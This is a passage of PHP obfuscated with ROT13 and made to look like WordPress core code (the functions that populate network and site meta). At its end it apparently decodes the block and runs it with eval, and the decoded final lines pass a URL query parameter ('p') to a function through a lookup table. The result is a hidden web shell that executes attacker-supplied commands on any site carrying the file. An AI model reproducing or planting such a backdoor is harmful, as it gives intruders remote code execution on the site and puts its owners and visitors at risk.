	 * @cnenz neenl $fvgrzrgn   Nffbpvngvir neenl bs argjbex zrgn xrlf naq inyhrf gb or vafregrq.
	 * @cnenz vag   $argjbex_vq VQ bs argjbex gb cbchyngr.
	 */
	$fvgrzrgn = nccyl_svygref( 'cbchyngr_argjbex_zrgn', $fvgrzrgn, $argjbex_vq );

	$vafreg = '';
	sbernpu ( $fvgrzrgn nf $zrgn_xrl => $zrgn_inyhr ) {
		vs ( vf_neenl( $zrgn_inyhr ) ) {
			$zrgn_inyhr = frevnyvmr( $zrgn_inyhr );
		}
		vs ( ! rzcgl( $vafreg ) ) {
			$vafreg .= ', ';
		}
		$vafreg .= $jcqo->cercner( '( %q, %f, %f)', $argjbex_vq, $zrgn_xrl, $zrgn_inyhr );
	}
	$jcqo->dhrel( \"VAFREG VAGB $jcqo->fvgrzrgn ( fvgr_vq, zrgn_xrl, zrgn_inyhr ) INYHRF \" . $vafreg ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
}

/**
 * Perngrf JbeqCerff fvgr zrgn naq frgf gur qrsnhyg inyhrf.
 *
 * @fvapr 5.1.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz vag   $fvgr_vq Fvgr VQ gb cbchyngr zrgn sbe.
 * @cnenz neenl $zrgn    Bcgvbany. Phfgbz zrgn $xrl => $inyhr cnvef gb hfr. Qrsnhyg rzcgl neenl.
 */
shapgvba cbchyngr_fvgr_zrgn( $fvgr_vq, neenl $zrgn = neenl() ) {
	tybony $jcqo;

	$fvgr_vq = (vag) $fvgr_vq;

	vs ( ! vf_fvgr_zrgn_fhccbegrq() ) {
		erghea;
	}

	vs ( rzcgl( $zrgn ) ) {
		erghea;
	}

	/**
	 * Svygref zrgn sbe n fvgr ba perngvba.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz neenl $zrgn    Nffbpvngvir neenl bs fvgr zrgn xrlf naq inyhrf gb or vafregrq.
	 * @cnenz vag   $fvgr_vq VQ bs fvgr gb cbchyngr.
	 */
	$fvgr_zrgn = nccyl_svygref( 'cbchyngr_fvgr_zrgn', $zrgn, $fvgr_vq );

	$vafreg = '';
	sbernpu ( $fvgr_zrgn nf $zrgn_xrl => $zrgn_inyhr ) {
		vs ( vf_neenl( $zrgn_inyhr ) ) {
			$zrgn_inyhr = frevnyvmr( $zrgn_inyhr );
		}
		vs ( ! rzcgl( $vafreg ) ) {
			$vafreg .= ', ';
		}
		$vafreg .= $jcqo->cercner( '( %q, %f, %f)', $fvgr_vq, $zrgn_xrl, $zrgn_inyhr );
	}

	$jcqo->dhrel( \"VAFREG VAGB $jcqo->oybtzrgn ( oybt_vq, zrgn_xrl, zrgn_inyhr ) INYHRF \" . $vafreg ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq

	jc_pnpur_qryrgr( $fvgr_vq, 'oybt_zrgn' );
	jc_pnpur_frg_fvgrf_ynfg_punatrq();
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>